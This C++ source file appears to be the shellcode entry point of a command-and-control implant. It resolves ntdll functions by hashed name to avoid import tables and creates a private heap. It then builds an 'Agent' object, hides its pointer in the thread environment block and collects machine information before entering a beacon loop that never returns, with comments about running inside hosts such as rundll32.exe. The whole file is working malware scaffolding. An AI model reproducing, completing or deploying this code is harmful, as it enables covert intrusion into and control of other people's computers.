#include <windows.h>
#include <Native.h>
#include <Agent.h>
#include <Defines.h>
#include <Hash.h>
#include <LdrLoad.h>

extern "C" ULONG_PTR EndPtr();

extern "C" DECLFN void Main()
{
    // // Step 1: Find where our shellcode lives in memory
    // ULONG_PTR base  = StartPtr();
    // ULONG_PTR length    = EndPtr() - base;

    // step 2: find ntdll.dll - neede before anything else
    ULONG_PTR ntdll = LdrLoad::Module( Hash::Str( L"ntdll.dll" ) );
    if( !ntdll ) return;

    // Step 3: Resolve heap Functions directly from ntdll export table
    auto _RtlCreateHeap = (decltype(RtlCreateHeap)*) LdrLoad::_Api( ntdll, Hash::Str( "RtlCreateHeap" ) );
    auto _RtlAllocateHeap = (decltype(RtlAllocateHeap)*) LdrLoad::_Api( ntdll, Hash::Str( "RtlAllocateHeap" ) );

    if( !_RtlCreateHeap || !_RtlAllocateHeap ) return;

    // Step 4: Create a private heap for the agent to live in
    PVOID heap = _RtlCreateHeap( HEAP_GROWABLE, nullptr, 0, 0, nullptr, nullptr );
    if ( !heap ) return;

    // step 5: Allocate spcae for the Agent object inside the heap
    PVOID ptr = _RtlAllocateHeap( heap, HEAP_ZERO_MEMORY, sizeof(Root::Agent) );
    if ( !ptr ) return;

    //step 6: Construct agent at that address (runs the constructor)
    Root::Agent* agent = new (ptr) Root::Agent();

    // step 7: Store the heap handle so the agent can allocate memory later
    agent->Session.HeapHandle = (ULONG_PTR)heap;
    agent->Hp.Handle          = heap;

    // step 8: Register agent pointer so G_AGENT can find it on this thread.
    // Store in TEB.ArbitraryUserPointer (+0x28) - reserved for application use.
    // Do NOT write into ProcessHeaps: RtlCreateHeap already added the heap handle
    // there, and writing agent (a heap block, not a heap handle) into that array
    // corrupts ntdll's heap tracking, crashing any host with concurrent threads
    // (e.g. rundll32.exe) with STATUS_STACK_BUFFER_OVERRUN.
    NtCurrentTeb()->ArbitraryUserPointer = agent;

    // step 9: run Init() to resolve reamining API's and collect machine info
    agent->Init();

    // step 10: Enter the beacon loop - this never returns
    agent->Start();

}